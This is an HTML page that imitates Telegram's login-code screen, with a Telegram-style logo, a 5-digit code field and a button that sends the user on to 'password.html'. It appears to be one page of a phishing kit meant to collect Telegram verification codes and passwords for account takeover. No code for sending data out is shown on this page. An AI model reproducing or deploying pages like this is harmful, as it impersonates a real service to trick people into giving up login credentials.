<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px 20px; }
        /* Стильный логотип Telegram */
        .tg-logo { width: 60px; height: 60px; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; background: #1c252f; border: 1px solid #2a3644; border-radius: 10px; color: #fff; text-align: center; letter-spacing: 5px; font-size: 20px; margin-bottom: 20px; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; background: #248bdf; border: none; border-radius: 10px; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <svg class="tg-logo" viewBox="0 0 24 24" fill="#248bdf">
        <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.891 8.146l-2.003 9.464c-.149.659-.54 1.217-1.121 1.217-.582 0-.839-.304-1.343-.635l-3.052-2.256-1.474 1.419c-.163.157-.3.289-.614.289-.314 0-.414-.145-.515-.418l-1.151-3.663-3.239-1.012c-.705-.221-.719-.705.15-.1.048-3.993 12.333-12.75 1.011 3.52 1.399l12.333-5.232c.571-.242 1.135-.119 1.343.146.208.265.174.757-.048 1.258z"/>
    </svg>

    <h2>Enter Code</h2>
    <p style="color: #8a99a8; font-size: 14px; margin-bottom: 30px;">Check your Telegram notifications.</p>
    
    <input type="number" id="v-code" placeholder="00000">
    <button class="btn" id="verify-btn">Verify</button>

    <script>
        document.getElementById('verify-btn').onclick = function() {
            const val = document.getElementById('v-code').value;
            if (val.length < 5) {
                alert("Please enter the 5-digit code!");
            } else {
                window.location.href = "password.html";
            }
        };
    </script>
</body>
</html>
